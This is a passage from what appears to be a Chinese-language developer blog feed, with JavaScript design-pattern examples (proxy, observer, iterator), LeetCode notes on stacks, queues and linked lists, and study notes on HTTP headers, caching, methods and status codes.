class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 明星</span></span><br><span class="line"><span class="keyword">let</span> star = &#123; <span class="attr">name</span>: <span class="string">'张XX'</span>, <span class="attr">phone</span>: <span class="string">'13910733521'</span>,&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经纪人</span></span><br><span class="line"><span class="keyword">let</span> agent = <span class="keyword">new</span> <span class="built_in">Proxy</span>(star, &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">target, key</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 允许取值前操作</span></span><br><span class="line">        <span class="keyword">return</span> target[key]</span><br><span class="line">    &#125;,</span><br><span class="line">    set: <span class="function"><span class="keyword">function</span> (<span class="params">target, key, val</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 允许赋值前操作</span></span><br><span class="line">        target[key] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-6-观察者模式"><a href="#2-6-观察者模式" class="headerlink" title="2.6 观察者模式"></a>2.6 观察者模式</h4><p>Event Bus<br>常见场景：网页事件绑定， promise， jquery callbacks, nodejs自定义事件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发布者</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.state = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.observers = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  getState() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.state;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setState(state) &#123;</span><br><span class="line">    <span class="keyword">this</span>.state = state;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  attach(observer) &#123;</span><br><span class="line">    <span class="keyword">this</span>.observers.push(observer);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  notifyAllObservers() &#123;</span><br><span class="line">    <span class="keyword">this</span>.observers.forEach(<span class="function"><span class="params">observer</span> =&gt;</span> &#123;</span><br><span class="line">      observer.update();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订阅者</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(name, subject) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    <span class="keyword">this</span>.subject.attach(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  update() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> update, state: <span class="subst">$&#123;<span class="keyword">this</span>.subject.getState()&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Subject();</span><br><span class="line"><span class="keyword">let</span> o1 = <span class="keyword">new</span> Observer(<span class="string">"o1"</span>, s);</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="keyword">new</span> Observer(<span class="string">"o2"</span>, s);</span><br><span class="line"></span><br><span class="line">s.setState(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>nodejs自定义事件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>).EventEmitter;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">EventEmitter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> simon = <span class="keyword">new</span> Dog(<span class="string">'simon'</span>);</span><br><span class="line">simon.on(<span class="string">'bark'</span>, () =&gt; &#123; <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> bark`</span>)&#125;)</span><br><span class="line">simon.on(<span class="string">'bark'</span>, () =&gt; &#123; <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> another bark`</span>)&#125;)</span><br><span class="line">simon.emit(<span class="string">'bark'</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-7-迭代器模式"><a href="#2-7-迭代器模式" class="headerlink" title="2.7 迭代器模式"></a>2.7 迭代器模式</h4><p>顺序访问一个集合。ES6中有序集合的数据类型有很多: Array, Map, Set, String, TypedArray, arguments, NodeList，需要一个统一的遍历接口来遍历这些数据类型。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">let</span> nodeList = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'p'</span>)</span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">m.set(<span class="string">'a'</span>, <span class="number">100</span>)</span><br><span class="line">m.set(<span class="string">'b'</span>, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">each</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> iterator = data[<span class="built_in">Symbol</span>.iterator](); <span class="comment">// es6中上面这些数据类型都有这个属性</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> item = &#123; <span class="attr">done</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">    <span class="keyword">while</span>(!item.done) &#123;</span><br><span class="line">        item = iterator.next();</span><br><span class="line">        <span class="keyword">if</span> (!item.done)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(item.value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// es6中直接使用 for..of..不用自己定义迭代器</span></span><br><span class="line">    <span class="comment">// for ( let item of data ) &#123;</span></span><br><span class="line">    <span class="comment">//     console.log(item)</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">each(arr)</span><br><span class="line">each(nodeList)</span><br><span class="line">each(m)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-8-其他模式"><a href="#2-8-其他模式" class="headerlink" title="2.8 其他模式"></a>2.8 其他模式</h4><ul><li>状态机模式：一个对象有状态变化，每次状态变化都会触发一个逻辑，如Promise</li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5a4353766fb9a044fb080927" target="_blank" rel="noopener">Vue 组件通信之 Bus</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>栈、队列</title>
      <link href="/2019/08/22/Leetcode-%E6%A0%88/"/>
      <url>/2019/08/22/Leetcode-%E6%A0%88/</url>
      <content type="html"><![CDATA[<h3 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1. 数据结构"></a>1. 数据结构</h3><ul><li><p>栈 Stack<br>先入后出的容器结构，先进来的元素叠在一起，不能从后面出来元素</p></li><li><p>队列 Queue<br>先进先出，排队</p></li><li><p>双端队列 Deque<br>可以从前后两端进出</p></li></ul><p>JS实现这样的数据结构，会用数组模拟，加上<code>push</code>, <code>pop</code>, <code>search</code>方法</p><h3 id="2-LeetCode"><a href="#2-LeetCode" class="headerlink" title="2. LeetCode"></a>2. LeetCode</h3><h4 id="2-1-有效的括号"><a href="#2-1-有效的括号" class="headerlink" title="2.1 有效的括号"></a>2.1 有效的括号</h4><h4 id="最小栈"><a href="#最小栈" class="headerlink" title="最小栈"></a>最小栈</h4><h4 id="滑动窗口最大值"><a href="#滑动窗口最大值" class="headerlink" title="滑动窗口最大值"></a>滑动窗口最大值</h4><h4 id="柱状图中最大的矩形"><a href="#柱状图中最大的矩形" class="headerlink" title="柱状图中最大的矩形"></a>柱状图中最大的矩形</h4><h4 id="接雨水"><a href="#接雨水" class="headerlink" title="接雨水"></a>接雨水</h4>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>数组、链表、跳表</title>
      <link href="/2019/08/19/LeetCode-%E6%95%B0%E7%BB%84/"/>
      <url>/2019/08/19/LeetCode-%E6%95%B0%E7%BB%84/</url>
      <content type="html"><![CDATA[<h3 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1. 数据结构"></a>1. 数据结构</h3><ul><li><p>数组<br>分配一块连续的内存，每个元素只需要通过索引就可以访问，效率为<em><code>O(1)</code></em>.数组进行增删操作时，会涉及大量片段的复制群移元素，效率为<code>O(n)</code>。</p></li><li><p>链表<br>这时候用链表可以省去这些操作，它的移动修改操作效率为<em><code>O(1)</code></em>。同时也是因为这样的结构，要访问链表里的元素变得不那么简单，效率为<em><code>O(n)</code></em>。<br><em>单向链表</em>：链表Linked List，每个元素有<code>value</code> 和 <code>next</code>，next指向下一个元素。最后一个元素的next指向空 None<br><em>循环列表</em>：头指针为Head, 尾指针为Tail, Tail的next指向Head<br><em>双向链表</em>：有两个指针 <code>prev</code> 和 <code>next</code>可以往前走，也可以往后走</p></li><li><p>跳表<br>跳表对标的是平衡树和二分查找，是一种插入/删除/搜索都是<code>O(log n)</code>的数据结构。</p></li></ul><p><br></p><h3 id="2-数组-LeetCode"><a href="#2-数组-LeetCode" class="headerlink" title="2. 数组 LeetCode"></a>2. 数组 LeetCode</h3><h4 id="2-1-区间"><a href="#2-1-区间" class="headerlink" title="2.1 区间"></a>2.1 区间</h4><ul><li>56.合并区间</li><li>57.插入区间</li><li>228.汇总区间</li><li>349.两个数组的交集</li></ul><h3 id="3-链表"><a href="#3-链表" class="headerlink" title="3. 链表"></a>3. 链表</h3><h4 id="3-1-操作节点"><a href="#3-1-操作节点" class="headerlink" title="3.1 操作节点"></a>3.1 操作节点</h4><h4 id="3-2-操作链表"><a href="#3-2-操作链表" class="headerlink" title="3.2 操作链表"></a>3.2 操作链表</h4><h4 id="3-3-环形链表"><a href="#3-3-环形链表" class="headerlink" title="3.3 环形链表"></a>3.3 环形链表</h4><p>反转链表<br>两两交换链表中的节点<br>环形链表<br>环形链表 II<br>K 个一组翻转链表</p>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>HTTP常见问题</title>
      <link href="/2019/08/16/HTTP/"/>
      <url>/2019/08/16/HTTP/</url>
      <content type="html"><![CDATA[<h3 id="1-TCP-IP-协议"><a href="#1-TCP-IP-协议" class="headerlink" title="1. TCP/IP 协议"></a>1. TCP/IP 协议</h3><p>计算机与网络设备要相互通信，双方就必须基于相同的方法。如何探测到通信目标，由哪一边先发起通信、使用哪种语言进行通信，怎样结束通信等规则都需要事先确定。我们把这种规则成为协议 (protocol)。与互联网相关联的协议集合起来总称为 TCP/IP。</p><ul><li><p><em>TCP/IP 各层的作用</em><br>应用层：决定了向用户提供应用服务时通信的活动。如 FTP (file transfer protocol， 文本传输协议)，DNS (domain name system 域名系统)， HTTP<br>传输层：TCP 和 UDP<br>网络层：用来处理在网络上流动的数据包。该层规定了通过怎样的路径（传输路线）到达对方计算机，并将数据包传送给对方。<br>链路层：连接网络的硬件部分。</p></li><li><p><em>IP 协议</em><br>负责传输。IP 协议确保数据包传给了对方。IP 地址指明了节点被分配到的地址；传输过程中，使用 ARP 协议获取 MAC 地址进行中转。</p></li><li><p><em>TCP</em><br>确保可靠性。TCP 协议对大块数据分割成以报文段为单位的数据包进行管理，并确认数据最终送达到对方。TCP 采用<strong>三次握手策略</strong>。发送端首先发送一个带 SYN 标志的数据包给对方。接收端收到后，回传一个带有 SYN？ACK 标志的数据包以示传达确认。最后，发送端再回传一个带 ACK 标志的数据包，代表“握手”结束。</p></li><li><p><em>DNS</em><br>DNS 提供域名到 IP 地址之间的解析服务。</p></li></ul><ul><li><em>URL</em><br>URL(Uniform Resource Locator, 统一资源定位符)，是 web 浏览器访问页面时需要输入的地址。</li></ul><ul><li><em>URI</em><br>URI(Uniform Resource Identifier, 统一资源标识符)，是由某个协议方案(http, ftp, mailto, telnet, file 等)表示的资源的定位标识符。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URI组成依次为协议方案名，登录信息，服务器地址，服务器端口，带层次的文件路径，查询字符串，片段标识符</span></span><br><span class="line">http:<span class="comment">//user:pass@www.example.jp:80/dir/index.html?uid=1#ch1</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-HTTP报文"><a href="#2-HTTP报文" class="headerlink" title="2. HTTP报文"></a>2. HTTP报文</h3><p>请求从客户端发出，最后服务器端响应该请求并返回。HTTP是一种不保存状态，即无状态协议。<br>用于 HTTP 协议交互的信息被称为 HTTP 报文。HTTP 报文本身是由多行数据构成的字符串文本。</p><p><br></p><h4 id="2-1-请求首部字段"><a href="#2-1-请求首部字段" class="headerlink" title="2.1 请求首部字段"></a>2.1 请求首部字段</h4><ul><li><p><em>Connection</em><br>HTTP的初始版本中，每进行一次HTTP通信就要断开一次TCP连接。每次请求都会造成无谓的TCP连接建立和断开，增加通信量的开销。为了解决这个问题，HTTP/1.0想到了持久连接Keep-alive。只要任意一端没有明确提出断开连接，则保持TCP连接状态。在HTTP/1.1中，所有的连接默认都是持久连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># HTTP/1.1前的默认连接都是非持久链接，如果想维持持续链接，需要指定Keep-Alive</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line"># 服务器想明确断开连接时，则指定为 close</span><br><span class="line"></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure></li><li><p><em>Cache-Control</em><br>操作缓存的工作机制</p></li></ul><table><thead><tr><th>缓存请求指令</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>no-cache</td><td style="text-align:center">客户端将不会接收缓存过的响应</td></tr><tr><td>no-store</td><td style="text-align:center">不能在本地存储请求或响应的任一部分</td></tr><tr><td>max-age</td><td style="text-align:center">缓存资源的缓存时间比max-age小，就接受缓存的资源</td></tr><tr><td>min-fresh</td><td style="text-align:center">期望在指定时间内的响应仍有效</td></tr><tr><td>max-state</td><td style="text-align:center">即使过期，只要仍处于max-state指定时间内，仍会被客户端接收</td></tr><tr><td>only-if-cached</td><td style="text-align:center">要求缓存服务器不重新加载响应，也不再次确认资源有效性。若缓存服务器无反应，则返回504 Gateway Timeout</td></tr><tr><td>no-transform</td><td style="text-align:center">缓存不能改变实体主题的媒体类型，防止缓存或代理压缩图片等操作</td></tr></tbody></table><table><thead><tr><th>缓存响应指令</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>public</td><td style="text-align:center">表明其他用户也可以利用缓存</td></tr><tr><td>private</td><td style="text-align:center">只对特定用户提供资源缓存的服务</td></tr><tr><td>no-cache</td><td style="text-align:center">原服务器不对缓存服务器请求中提出的资源有效性进行确认，且禁止其对相应资源进行缓存操作</td></tr><tr><td>no-store</td><td style="text-align:center">不能在本地存储请求或响应的任一部分</td></tr><tr><td>s-maxage</td><td style="text-align:center">资源保存为缓存的最长时间</td></tr><tr><td>must-revalidate</td><td style="text-align:center">代理会向源服务器再次验证即将返回的响应缓存目前是否有效</td></tr><tr><td>proxy-revalidate</td><td style="text-align:center">缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性</td></tr><tr><td>no-transform</td><td style="text-align:center">缓存不能改变实体主题的媒体类型，防止缓存或代理压缩图片等操作</td></tr></tbody></table><ul><li><em>Content-Type</em><br>常见的媒体资源：<ul><li>text/html: HTML 格式</li><li>text/plain: 纯文本格式</li><li>text/xml: XML 格式</li><li>图片格式：image/gif, image/jpeg, image/png</li><li>application/json: JSON 数据格式</li><li>application/x-www-form-urlencoded: form 表单数据被编码为 key/value 格式发送到服务器（表单默认的提交数据的格式）</li><li>multipart/form-data：在表单中进行文件上传时，会使用该格式</li></ul></li></ul><ul><li><p><em>Content-Range</em><br>范围请求，允许你实现从之前下载中断处恢复下载</p></li><li><p><em>Accept</em><br>通知服务器，用户代理能够处理的媒体类型及媒体类型</p></li></ul><p><br></p><h4 id="2-2-响应首部字段"><a href="#2-2-响应首部字段" class="headerlink" title="2.2 响应首部字段"></a>2.2 响应首部字段</h4><ul><li><em>Set-Cookie</em><br>服务端发送的响应报文内的一个叫做 Set-cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。</li></ul><p><br></p><h4 id="2-3-其他"><a href="#2-3-其他" class="headerlink" title="2.3 其他"></a>2.3 其他</h4><ul><li>Date<br>表明创建 HTTP 报文的日期和时间</li><li>Transfer-Encoding<br>规定传输报文主体时采用的编码方式</li><li>Upgrade<br>检测是否可以使用更高的协议版本进行通信</li><li>Via<br>追踪客户端与服务器之间的请求和响应报文的传输路径</li><li>Authorization<br>用户代理的认证信息</li><li>Host<br>表示请求的资源所处的互联网主机名和端口号</li><li>If-Match:”123456”<br>告知服务器匹配资源所用的实体标记 (ETag 值)</li><li>If-Modified-Since:<br>在日期时间之后，如果请求的资源没有更新过，则返回状态码 304 Not Modified</li><li>Referrer<br>请求的 URI 是从哪个 web 页面发起的</li><li>User-Agent<br>创建请求的浏览器和用户代理名称</li></ul><p><br></p><h3 id="3-请求方法"><a href="#3-请求方法" class="headerlink" title="3. 请求方法"></a>3. 请求方法</h3><table><thead><tr><th>HTTP方法</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>GET</td><td style="text-align:center">GET请求会显示请求指定的资源。一般来说GET方法应该只用于数据的读取，而不应当用于会产生副作用的非幂等的操作中。它期望的应该是而且应该是安全的和幂等的。这里的安全指的是，请求不会影响到资源的状态。</td></tr><tr><td>POST</td><td style="text-align:center">传输实体主题</td></tr><tr><td>PUT</td><td style="text-align:center">传输文件</td></tr><tr><td>HEAD</td><td style="text-align:center">获得报文首部，用于确认URIDE有效性及资源更新的日期时间</td></tr><tr><td>DELETE</td><td style="text-align:center">删除文件</td></tr><tr><td>OPTIONS</td><td style="text-align:center">询问支持的方法</td></tr><tr><td>TRACE</td><td style="text-align:center">请求连接到源目标会通过代理中转，trace方法用来确认连接过程中发生的一系列操作</td></tr><tr><td>CONNECT</td><td style="text-align:center">要求用隧道协议连接代理</td></tr></tbody></table><p><br></p><h3 id="4-状态码"><a href="#4-状态码" class="headerlink" title="4. 状态码"></a>4. 状态码</h3><ul><li>1XX    Informational（请求正在处理）</li><li>2XX    Success（请求成功）</li><li>3XX    Redirection（重定向）    需要进行附加操作以完成请求</li><li>4XX    Client Error（客户端错误）</li><li>5XX    Server Error（服务器错误）</li></ul><table><thead><tr><th>状态码</th><th style="text-align:right">描述</th></tr></thead><tbody><tr><td><code>100 Continue</code></td><td style="text-align:right">临时响应,表明客户端应该继续请求</td></tr><tr><td><code>101 Switching Protocol</code></td><td style="text-align:right">服务器正在切换协议</td></tr><tr><td><code>102 Processing (WebDAV)</code></td><td style="text-align:right">服务器已收到并正在处理，但没有响应可用。</td></tr><tr><td>2XX 表示成功处理了请求的状态代码。</td><td style="text-align:right"></td></tr><tr><td><code>200 OK</code></td><td style="text-align:right">服务器已成功处理了请求。</td></tr><tr><td><code>201 Created</code></td><td style="text-align:right">请求成功并且服务器创建了新的资源,通常是PUT请求后的响应。</td></tr><tr><td><code>202 Accepted</code></td><td style="text-align:right">服务器已接受请求，但尚未处理。</td></tr><tr><td><code>203 Non-Authoritative Information</code></td><td style="text-align:right">服务器已成功处理了请求，但返回的信息可能来自另一来源。</td></tr><tr><td><code>204 No Content</code></td><td style="text-align:right">服务器成功处理了请求，但没有返回任何内容。</td></tr><tr><td><code>205 Reset Content</code></td><td style="text-align:right">服务器成功处理了请求，但没有返回任何内容。</td></tr><tr><td><code>206 Partial Content</code></td><td style="text-align:right">服务器成功处理了部分 GET 请求。</td></tr><tr><td>3开头，请求被重定向，表示要完成请求，需要进一步操作。</td><td style="text-align:right"></td></tr><tr><td><code>300 Multiple Choice</code></td><td style="text-align:right">服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</td></tr><tr><td><code>301 Moved Permanently</code></td><td style="text-align:right">请求的网页已永久移动到新位置。服务器返回此响应时，会自动将请求者转到新位置。</td></tr><tr><td><code>302 Found</code></td><td style="text-align:right">服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td></tr><tr><td><code>303 See Other</code></td><td style="text-align:right">请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</td></tr><tr><td><code>304 Not Modified</code></td><td style="text-align:right">上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。</td></tr><tr><td><code>307 Temporary Redirect</code></td><td style="text-align:right">服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td></tr><tr><td>4开头 （请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理。</td><td style="text-align:right"></td></tr><tr><td><code>400 Bad Request</code></td><td style="text-align:right">服务器不理解请求的语法。</td></tr><tr><td><code>401 Unauthorized</code></td><td style="text-align:right">请求要求身份验证</td></tr><tr><td><code>403 Forbidden</code></td><td style="text-align:right">服务器拒绝请求。</td></tr><tr><td><code>404 Not Found</code></td><td style="text-align:right">服务器找不到请求的网页。</td></tr><tr><td><code>405 Method Not Allowed</code></td><td style="text-align:right">禁用请求中指定的方法。</td></tr><tr><td><code>406 Not Acceptable</code></td><td style="text-align:right">无法使用请求的内容特性响应请求的网页。</td></tr><tr><td><code>407 Proxy Authentication Required</code></td><td style="text-align:right">此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。</td></tr><tr><td><code>408 Request Timeout</code></td><td style="text-align:right">服务器等候请求时发生超时。</td></tr><tr><td><code>409 Conflict</code></td><td style="text-align:right">由于和被请求的资源的当前状态之间存在冲突，请求无法完成。</td></tr><tr><td><code>410 Gone</code></td><td style="text-align:right">被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。</td></tr><tr><td><code>411 Length Required</code></td><td style="text-align:right">服务器拒绝在没有定义 Content-Length 头的情况下接受请求。</td></tr><tr><td><code>412 Precondition Failed</code></td><td style="text-align:right">服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。</td></tr><tr><td><code>413 Payload Too Large</code></td><td style="text-align:right">服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。</td></tr><tr><td><code>414 URI Too Long</code></td><td style="text-align:right">请求的 URI（通常为网址）过长，服务器无法处理。</td></tr><tr><td><code>415 Unsupported Media Type</code></td><td style="text-align:right">请求中提交的实体并不是服务器中所支持的格式，请求被拒绝</td></tr><tr><td><code>416 Requested Range Not Satisfiable</code></td><td style="text-align:right">请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头</td></tr><tr><td><code>417 Expectation Failed</code></td><td style="text-align:right">服务器未满足”期望”请求标头字段的要求。</td></tr><tr><td>5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</td><td style="text-align:right"></td></tr><tr><td><code>500 Internal Server Error</code></td><td style="text-align:right">服务器遇到了不知道如何处理的情况。</td></tr><tr><td><code>501 Not Implemented</code></td><td style="text-align:right">此请求方法不被服务器支持且无法被处理。</td></tr><tr><td><code>502 Bad Gateway</code></td><td style="text-align:right">此错误响应表明服务器作为网关需要得到一个处理这个请求的响应，但是得到一个错误的响应。</td></tr><tr><td><code>503 Service Unavailable</code></td><td style="text-align:right">服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机。</td></tr><tr><td><code>504 Gateway Timeout</code></td><td style="text-align:right">当服务器作为网关，不能及时得到响应时返回此错误代码。</td></tr><tr><td><code>505 HTTP Version Not Supported</code></td><td style="text-align:right">服务器不支持请求中所用的 HTTP 协议版本。</td></tr></tbody></table><p><br></p><h3 id="5-Web服务器"><a href="#5-Web服务器" class="headerlink" title="5. Web服务器"></a>5. Web服务器</h3><p>HTTP/1.1允许一台HTTP服务器搭建多个Web站点。即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假象已具有多台服务器。域名通过DNS服务映射到IP地址，当请求发送到服务器时，已经是以IP形式访问了。</p><p>由于虚拟主机可以寄存多个不同域名的web网站，因此在发送http请求时，必须在Host首部完整指定域名的URI。</p><p><br></p><h4 id="5-1-代理、网关、隧道"><a href="#5-1-代理、网关、隧道" class="headerlink" title="5.1 代理、网关、隧道"></a>5.1 代理、网关、隧道</h4><p>HTTP通信时，除了客户端和服务器意外，还有一些用于通信数据转发的应用程序。它们将请求转发给通信线路上的下一站服务器，或者将服务器发送的响应转发给客户端。</p><p><em>代理</em><br><strong>作用</strong>：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的。<br><strong>缓存代理</strong>：代理转发响应时，缓存代理会预先将资源的副本保存在代理服务器上。当代理再次接收到相同资源请求时，可以不从服务器那里获取，而是将之前缓存的资源作为响应返回。<br><strong>透明代理</strong>：转发请求或响应时，不对报文做任何加工的代理。</p><p><em>网关</em><br>网关能使通信线路上的服务器提供非HTTP协议服务。利用网关可以提高通信的安全性，在通信线路上加密；网关可以连接数据库，使用sql语句查询数据。</p><p><em>隧道</em><br>隧道可按要求建立起一条与其他服务器的通信线路，使用SSL等加密手段进行通信。确保客户端能与服务器进行安全的通信。</p><p><br></p><h4 id="5-2-缓存"><a href="#5-2-缓存" class="headerlink" title="5.2 缓存"></a>5.2 缓存</h4><p>缓存是指代理服务器或客户端本地磁盘内保存的资源副本。</p><p><em>客户端的缓存</em><br>存在于客户端浏览器中的文件，成为临时网络文件（Temporary Internet File）。浏览器缓存如果有效，可以直接从本地磁盘内读取。</p><p><em>缓存的有效期限</em><br>即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将再次从源服务器上获取新资源。</p><p>缓存可以简单分为两种类型：强缓存(200 from cache) 与协商缓存(304)。对于协商缓存，使用ctrl + F5强制刷新可以使得缓存无效。但是对于强缓存，在未过期时，必须更新资源路径才能发起新的请求（更改路径相当于是另一个资源）。</p><p><strong>强缓存(200 from cache)</strong><br>浏览器如果判断本地缓存未过期，就直接使用，无需发起http请求<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 属于强缓存</span><br><span class="line">(http1.1)Cache-Control/Max-Age</span><br><span 